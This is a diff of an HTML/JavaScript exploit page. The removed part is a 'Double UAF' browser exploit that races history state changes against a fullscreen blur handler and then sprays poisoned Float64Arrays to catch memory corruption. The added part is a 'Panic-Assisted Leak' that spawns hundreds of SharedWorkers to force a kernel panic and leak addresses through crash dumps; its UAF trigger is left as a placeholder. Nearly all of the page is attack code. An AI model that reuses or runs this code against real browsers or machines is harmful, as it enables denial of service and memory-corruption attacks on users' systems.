@@ -1,82 +1,64 @@
 
 <!DOCTYPE html>
 <html>
-<head><title>Double UAF Exploit</title></head>
+<head><title>Panic-Assisted Leak</title></head>
 <body>
-<button onclick="exploit()">Double UAF</button>
+<button onclick="leak()">Leak via Panic</button>
 <pre id="log"></pre>
 
 <script>
 const logEl = document.getElementById("log");
 function log(m) { logEl.textContent += m + "\n"; }
 
-const BASE = 977, STEP = 14461, UAF_ITERS = 48;
-
-let victim = {
-  id: "VICTIM",
-  data: new Float64Array(1024)
-};
-
-async function exploit() {
-  log("=== DOUBLE UAF EXPLOIT ===\n");
+async function leak() {
+  log("=== KERNEL PANIC INFO LEAK ===\n");
   
-  // 1. Trigger History UAF
-  log("[1] Triggering History UAF...");
-  let size = BASE;
-  for(let i=0; i<UAF_ITERS; i++){
-    history.pushState({index:i, victim: victim}, "", "#" + "E".repeat(size));
-    history.replaceState({index:i}, "", "#" + "E".repeat(size >> 1));
-    if(i % 6 === 0) setTimeout(()=>history.back(), 0);
-    size += STEP;
-    await new Promise(r=>setTimeout(r,5));
+  // 1. Criar objetos com padrões conhecidos
+  const marker = new Uint32Array(1024);
+  for(let i=0; i<1024; i++) {
+    marker[i] = 0xDEAD0000 + i;
   }
   
-  // 2. Durante race window, trigger Fullscreen UAF
+  log("[1] Created marker array with pattern");
+  
+  // 2. Trigger UAF History
+  log("[2] Triggering UAF...");
+  // ... (código do UAF)
+  
+  // 3. Durante race, criar SharedWorkers até panic
   window.addEventListener('popstate', (e) => {
     if(e.state && e.state.index >= 40) {
-      log("\n[2] RACE WINDOW! Triggering Fullscreen UAF...");
+      log("\n[3] RACE! Creating SharedWorkers...");
       
-      // Request fullscreen
-      document.documentElement.requestFullscreen();
+      const workers = [];
+      let count = 0;
       
-      // Setup fullscreen UAF
-      window.onblur = function() {
-        log("\n[3] BLUR! Freeing victim...");
-        
-        // FREE
-        victim = null;
-        
-        // SPRAY
-        const spray = [];
-        for(let i=0; i<5000; i++) {
-          const poison = new Float64Array(128);
-          poison.fill(2.121995791e-314); // 0x4141...
-          spray.push(poison);
-        }
-        
-        log("    Sprayed 5000 poisoned arrays");
-        log("    >> Press REFRESH to crash <<");
-        
-        // Tentar acessar via history
-        try {
-          history.forward();
-          const recovered = history.state.victim;
-          log(`\n    Recovered victim: ${recovered ? recovered.id : 'null'}`);
-          
-          if(recovered && recovered.data) {
-            log(`    Data length: ${recovered.data.length}`);
-            log(`    Data[0]: 0x${recovered.data[0].toString(16)}`);
+      const interval = setInterval(() => {
+        for(let i=0; i<5; i++) {
+          try {
+            const w = new SharedWorker(
+              "data:text/javascript,onconnect=e=>e.ports[0].start()",
+              "leak_" + Date.now() + "_" + count
+            );
+            w.port.start();
+            workers.push(w);
+            count++;
             
-            if(recovered.data[0] === 0x4141414141414141) {
-              log("\n    🚨 CORRUPTION! Victim points to spray!");
+            if(count >= 410) {
+              clearInterval(interval);
+              log(`\n[4] Reached 410 workers. Panic imminent...`);
+              log("    Check crash dump for leaked addresses!");
+              return;
             }
+          } catch(e) {
+            clearInterval(interval);
+            log(`Error at ${count}: ${e.message}`);
+            return;
           }
-        } catch(err) {
-          log(`    Error: ${err.message}`);
         }
-      };
-      
-      log("    Fullscreen UAF armed. Press OPTIONS menu.");
+        
+        if(count % 50 === 0) log(`  Active: ${count}...`);
+      }, 5);
     }
   });
   
